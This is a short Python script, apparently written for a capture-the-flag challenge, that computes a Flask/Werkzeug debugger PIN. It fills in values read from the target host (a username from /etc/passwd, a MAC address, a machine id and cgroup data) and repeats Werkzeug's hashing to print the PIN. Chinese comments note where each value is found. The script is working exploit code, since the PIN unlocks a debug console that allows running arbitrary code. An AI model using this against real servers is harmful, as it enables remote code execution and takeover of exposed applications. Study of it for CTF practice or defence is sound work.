#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'CTF'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.7/site-packages/flask/app.py', # 报错得到
]

private_bits = [
    '279873956892776',#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后1,3)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    'docker-8688bda20ab2157a4a6e1ad8051c7349bb27f2f67f8150e8a3c111c61cfdaca1.scope'#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

